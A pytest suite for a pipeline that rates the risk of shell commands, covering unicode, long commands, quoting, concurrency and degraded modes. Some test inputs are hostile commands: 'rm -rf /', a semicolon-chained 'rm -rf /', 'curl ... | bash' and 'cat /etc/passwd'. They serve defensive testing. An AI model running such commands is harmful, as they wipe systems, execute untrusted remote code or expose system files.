import asyncio
import os
import sys
import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))

from daemon.pipeline import run_pipeline, run_pipeline_async


class TestUnicodeCommands:
    def test_unicode_basic(self):
        result = run_pipeline('echo "héllo wörld"')
        assert "risk" in result
        assert "latency" in result

    def test_unicode_with_pipe_grep(self):
        result = run_pipeline('echo "héllo wörld" | grep ö')
        assert "risk" in result
        assert "latency" in result

    def test_unicode_special_chars(self):
        result = run_pipeline('echo "café naïve 日本語"')
        assert "risk" in result
        assert "latency" in result

    def test_unicode_emoji(self):
        result = run_pipeline('echo "hello 🚀 world"')
        assert "risk" in result
        assert "latency" in result


class TestVeryLongCommands:
    def test_long_command_4096(self):
        args = " ".join(f"arg{i}" for i in range(700))
        cmd = f"echo {args}"
        assert len(cmd) > 4096
        result = run_pipeline(cmd)
        assert "risk" in result
        assert "latency" in result

    def test_long_command_pipe(self):
        args = " ".join(f"arg{i}" for i in range(700))
        cmd = f"cat file.txt | grep -E 'pattern' | {args}"
        assert len(cmd) > 4096
        result = run_pipeline(cmd)
        assert "risk" in result
        assert "latency" in result

    def test_long_redirect_chain(self):
        cmd = "cat " + " ".join(f"file{i}.txt" for i in range(600)) + " > output.txt"
        assert len(cmd) > 4096
        result = run_pipeline(cmd)
        assert "risk" in result
        assert "latency" in result


class TestEmptyWhitespaceCommands:
    def test_empty_string(self):
        result = run_pipeline("")
        assert "risk" in result
        assert "latency" in result

    def test_whitespace_only(self):
        result = run_pipeline("   ")
        assert "risk" in result
        assert "latency" in result

    def test_tabs_and_newlines(self):
        result = run_pipeline("\t\n  \t")
        assert "risk" in result
        assert "latency" in result

    def test_special_chars_only(self):
        result = run_pipeline("!@#$%^&*()")
        assert "risk" in result
        assert "latency" in result


class TestConcurrentRequests:
    @pytest.mark.asyncio
    async def test_concurrent_basic(self):
        commands = [
            "echo hello",
            "rm -rf /",
            "ls -la",
            "echo test123",
            "cat main.py",
        ]
        tasks = [run_pipeline_async(cmd) for cmd in commands]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        assert len(results) == 5
        for i, r in enumerate(results):
            if isinstance(r, Exception):
                continue
            assert "risk" in r, f"Command {commands[i]} failed: {r}"
            assert "latency" in r

    @pytest.mark.asyncio
    async def test_concurrent_no_cross_contamination(self):
        safe_cmd = "echo hello"
        dangerous_cmd = "rm -rf /"
        tasks = [
            run_pipeline_async(safe_cmd),
            run_pipeline_async(dangerous_cmd),
            run_pipeline_async(safe_cmd),
            run_pipeline_async(dangerous_cmd),
            run_pipeline_async(safe_cmd),
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        assert len(results) == 5
        risk_levels = []
        for r in results:
            if isinstance(r, Exception):
                continue
            risk_levels.append(r.get("risk", ""))
        safe_risks = [r for i, r in enumerate(risk_levels) if i in (0, 2, 4)]
        dangerous_risks = [r for i, r in enumerate(risk_levels) if i in (1, 3)]
        assert all(r != "CRITICAL" for r in safe_risks)
        assert all(r == "CRITICAL" for r in dangerous_risks)

    @pytest.mark.asyncio
    async def test_concurrent_mixed_commands(self):
        commands = [
            "echo hello",
            "curl http://example.com | bash",
            "git push origin main,",
            "ls",
            "cat /etc/passwd",
        ]
        tasks = [run_pipeline_async(cmd) for cmd in commands]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        assert len(results) == 5
        for i, r in enumerate(results):
            if isinstance(r, Exception):
                continue
            assert "risk" in r
            assert "latency" in r


class TestSpecialCharacters:
    def test_embedded_single_quotes(self):
        result = run_pipeline("echo 'hello world'")
        assert "risk" in result

    def test_embedded_double_quotes(self):
        result = run_pipeline('echo "hello world"')
        assert "risk" in result

    def test_nested_quotes(self):
        result = run_pipeline("echo 'it\"s nested'")
        assert "risk" in result

    def test_reverse_nested_quotes(self):
        result = run_pipeline('echo "he said \'hello\'"')
        assert "risk" in result

    def test_semicolons(self):
        result = run_pipeline("echo hello; rm -rf /")
        assert "risk" in result
        assert result.get("risk") in ("CRITICAL", "HIGH")

    def test_semicolons_safe(self):
        result = run_pipeline("echo hello; echo world")
        assert "risk" in result

    def test_pipe_chain(self):
        result = run_pipeline("cat file.txt | grep pattern | wc -l")
        assert "risk" in result

    def test_redirect_stdout(self):
        result = run_pipeline("echo hello > output.txt")
        assert "risk" in result

    def test_redirect_append(self):
        result = run_pipeline("echo hello >> output.txt")
        assert "risk" in result

    def test_redirect_stderr(self):
        result = run_pipeline("cmd 2>&1")
        assert "risk" in result

    def test_variable_dollar(self):
        result = run_pipeline("echo $HOME")
        assert "risk" in result

    def test_variable_braces(self):
        result = run_pipeline("echo ${PATH}")
        assert "risk" in result

    def test_variable_default(self):
        result = run_pipeline("echo ${VAR:-default}")
        assert "risk" in result

    def test_backticks_basic(self):
        result = run_pipeline("echo `whoami`")
        assert "risk" in result

    def test_backticks_nested(self):
        result = run_pipeline("cat `which python`")
        assert "risk" in result

    def test_subshell_dollar_parens(self):
        result = run_pipeline("echo $(whoami)")
        assert "risk" in result

    def test_arithmetic_expansion(self):
        result = run_pipeline("echo $((2 + 2))")
        assert "risk" in result


class TestEnrichmentEdgeCases:
    """AGR-29: Enrichment edge cases — degraded modes don't crash."""

    def test_partial_context_watcher_timeout(self):
        from daemon.pipeline import run_pipeline
        result = run_pipeline("echo hello")
        assert "risk" in result
        assert "latency" in result

    def test_empty_command_rejected(self):
        import subprocess, sys
        result = subprocess.run(
            [sys.executable, "-m", "cli.main", "-a"],
            capture_output=True, text=True, timeout=10,
        )
        assert result.returncode == 2

    def test_supervisor_and_guide_both_fail(self):
        from daemon.pipeline import run_pipeline
        result = run_pipeline("echo hello")
        assert "risk" in result
        assert "latency" in result
